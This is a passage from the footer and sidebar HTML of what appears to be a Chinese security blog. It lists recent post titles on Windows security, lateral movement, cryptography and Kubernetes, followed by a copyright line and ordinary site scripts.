href="/2021/08/27/%E5%88%A9%E7%94%A8DCOM%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/" title="利用DCOM进行横向渗透">利用DCOM进行横向渗透</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/" title="分类于 密码学">密码学</a></div><span><a href="/2022/03/29/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81-HTTPS%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/" title="HTTPS协议分析">HTTPS协议分析</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Windows%E5%AE%89%E5%85%A8/" title="分类于 Windows安全">Windows安全</a></div><span><a href="/2021/07/26/Windows%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81/" title="Windows抓取密码">Windows抓取密码</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/" title="分类于 密码学">密码学</a></div><span><a href="/2022/03/28/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81-%E5%85%AC%E7%A7%81%E9%92%A5%E5%88%9B%E5%BB%BA/" title="非对称密码-公私钥的创建">非对称密码-公私钥的创建</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Windows%E5%AE%89%E5%85%A8/" title="分类于 Windows安全">Windows安全</a></div><span><a href="/2021/12/26/COM%E5%8A%AB%E6%8C%81/" title="COM在权限维持中的应用">COM在权限维持中的应用</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Vlunstack/" title="分类于 Vlunstack">Vlunstack</a></div><span><a href="/2020/10/26/Vlunstack1/" title="Vlunsatck1">Vlunsatck1</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%85%B6%E4%BB%96-%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/" title="分类于 其他 服务器配置">其他 服务器配置</a></div><span><a href="/2022/03/14/Tengine%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9upstream/" title="Tengine动态修改upstream">Tengine动态修改upstream</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" title="分类于 容器安全">容器安全</a></div><span><a href="/2022/02/15/k8s-kunbernetes%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="k8s-Kubernetes环境搭建">k8s-Kubernetes环境搭建</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2021 – <span itemprop="copyrightYear">2022</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">ruyue @ 如月专注</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">83k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">1:16</span></div><div class="powered-by"></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2021/08/27/利用DCOM进行横向渗透/",favicon:{show:"夺去目光的故事",hide:"蒙上双眼的故事"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->